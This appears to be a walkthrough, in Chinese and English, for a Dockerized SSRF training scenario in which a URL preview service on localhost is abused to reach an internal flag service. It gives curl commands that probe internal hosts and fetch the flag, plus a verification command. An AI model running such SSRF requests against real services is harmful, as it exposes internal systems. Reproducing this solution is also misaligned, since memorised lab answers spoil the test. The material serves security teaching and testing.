# WEB-10: SSRF Internal Service Access

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-10 |
| 名称 | SSRF Internal Service Access |
| 技术/CVE | N/A (SSRF misconfiguration) |
| 难度 | L1 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10110 |

## 场景概述
- 技术：N/A (SSRF misconfiguration)
- 难度：L1
- 交付方式：docker
- 入口端口：10110
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE/Technique | SSRF (Server-Side Request Forgery) |
| Difficulty | L1 |
| Port | 10110 |
| Path | scenarios/web/ssrf-internal/ |
| Type | docker |
| Service | URL Preview Service (public) + Internal Flag Service (private) |

### Attack Path Summary
```
User submits internal URL → Server fetches without validation → SSRF to internal service → Flag returned
```

### Prerequisites

#### Knowledge
- SSRF原理 (SSRF principles): Understanding how SSRF attacks work to access internal resources
- Docker内部网络通信 (Docker internal network communication): Knowledge of Docker container networking and internal hostname resolution
- HTTP GET请求构造 (HTTP GET request construction): Crafting HTTP requests with query parameters

#### Tools
- curl: Send HTTP requests and test SSRF against internal services
- Burp Suite: Intercept, modify, and replay HTTP requests

### Step-by-Step Exploitation

#### Step 1: Access the URL Preview Service

Open the target service to confirm it is running and understand its functionality.

```bash
curl http://localhost:10110/
```

#### Step 2: Test Normal URL Fetch

Submit a legitimate external URL to verify the fetch functionality works as expected.

```bash
curl "http://localhost:10110/fetch?url=http://example.com"
```

#### Step 3: Discover Internal Service by Probing

Probe common internal hostnames and ports to discover services within the Docker network.

```bash
curl "http://localhost:10110/fetch?url=http://internal:5000/"
```

#### Step 4: Directly Access the Flag

Once the internal service is discovered, request the flag endpoint directly via the SSRF vector.

```bash
curl "http://localhost:10110/fetch?url=http://internal:5000/flag"
```

The flag is returned in the response body.

### Flag Location
- `/flag.txt` inside the internal container, accessible only via SSRF through the URL Preview Service

### Verification Commands
```bash
curl -s "http://localhost:10110/fetch?url=http://internal:5000/flag" | grep -o 'flag{[^}]*}'
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | HTTP URL fetch feature and internal service addressing |
| 侦察与前置条件 | SSRF parameter behavior and reachable internal host/port enumeration |
| 核心漏洞与利用 | Send server-side requests to an internal-only service |
| 权限、横向或影响 | Bypass network exposure boundary |
| 验证 | Read the internal response containing the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。
